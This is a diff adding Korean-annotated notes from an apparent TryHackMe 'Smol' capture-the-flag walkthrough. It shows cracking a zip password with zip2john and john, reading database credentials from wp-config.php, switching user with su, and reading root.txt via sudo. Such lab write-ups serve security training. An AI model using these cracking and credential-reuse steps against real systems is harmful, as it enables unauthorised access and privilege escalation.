@@ -1148,3 +1148,165 @@ wget http://www.smol.thm:8080/wordpress.old.zip
 # wget 없을 때
 
 curl -O http://smol.thm:8080/wordpress.old.zip
+
+# zip2john
+
+# zip2john wordpress.old.zip > wordpress_hash.txt
+
+┌──(root㉿docker-desktop)-[/]
+└─# cat wordpress_hash.txt
+wordpress.old.zip:$pkzip$8*1*1*0*0*24*a31c*c2fb90b3964ce4863c047a66cc23c2468ea4fffe2124c38cb9c91659b31793de138ae891*1*0*0*24*a31c*7722f8032fb202c65e40d0d76a91cdfa948dc7e6857f209a06627320940fa5bcbb2603e6*1*0*0*24*a31c*592448eb70b5198cef005c60d3aeb3d78465376eaa5f465e1c2dd7c890d613102e284c88*1*0*0*24*a320*f87c1c69a82331ca288320268e6c556a6ddc31a03e519747bd7b811b6b837527c82abe0e*1*0*0*24*a320*dc42fd5700a7ab7a3353cc674906dec0d6b997d8d56cc90f1248d684df3382d4d8c3ea45*1*0*0*24*a320*c96021e04f0d8a5ce6f787365277b4c9966e228fe80a3d29bc67d14431ecbab621d9cb77*1*0*0*24*a320*35fe982e604f7d27fedd1406d97fc4e874ea7df806bda1fea74676d3510a698ec6a7a3ac*2*0*26*1a*8c9ae7e6*60ed*6c*0*26*a31c*7106504d46479d273327e56f5e3a9dd835ebf0bf28cc32c4cb9c0f2bb991b7acaaa97c9c3670*$/pkzip$::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip
+
+# john --wordlist=/usr/share/wordlists/rockyou.txt wordpress_hash.txt
+
+┌──(root㉿docker-desktop)-[/]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt wordpress_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hero_gege@hotmail.com (wordpress.old.zip)  
+1g 0:00:00:00 DONE (2025-07-26 08:35) 1.369g/s 10458Kp/s 10458Kc/s 10458KC/s hesse..hellome2010
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+# cracking success -> hero_gege@hotmail.com (wordpress.old.zip)
+
+gege@ip-10-10-97-230:~$ unzip wordpress.old.zip
+
+wordpress.old wordpress.old.zip
+gege@ip-10-10-97-230:~$ cd wordpress.old/
+gege@ip-10-10-97-230:~/wordpress.old$ ls
+index.php readme.html wp-admin wp-comments-post.php wp-content wp-includes wp-load.php wp-mail.php wp-signup.php xmlrpc.php
+license.txt wp-activate.php wp-blog-header.php wp-config.php wp-cron.php wp-links-opml.php wp-login.php wp-settings.php wp-trackback.php
+gege@ip-10-10-97-230:~/wordpress.old$ cat wp-config.php
+
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the web site, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/documentation/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'xavi' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
+
+/** Database hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+define( 'AUTH_SALT',        'put your unique phrase here' );
+define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
+define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
+define( 'NONCE_SALT',       'put your unique phrase here' );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', true );
+
+/* Add any custom values between this line and the "stop editing" line. */
+
+
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+        define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+gege@ip-10-10-97-230:~/wordpress.old$
+
+
+# xavi
+define( 'DB_USER', 'xavi' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
+
+# su xavi
+
+xavi@ip-10-10-97-230:~$ id
+uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
+xavi@ip-10-10-97-230:~$
+
+# sudo ls -> sudo 사용 가능
+
+xavi@ip-10-10-97-230:~$ id
+uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
+xavi@ip-10-10-97-230:~$ sudo ls
+[sudo] password for xavi: 
+xavi@ip-10-10-97-230:~$
+
+# root.txt
+
+bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  swap.img  sys  tmp  usr  var
+xavi@ip-10-10-97-230:/$ cd /root
+bash: cd: /root: Permission denied
+xavi@ip-10-10-97-230:/$ sudo ls /root
+root.txt  snap
+xavi@ip-10-10-97-230:/$ sudo cat /root/root.txt
+bf89ea3ea01992353aef1f576214d4e4
+xavi@ip-10-10-97-230:/$
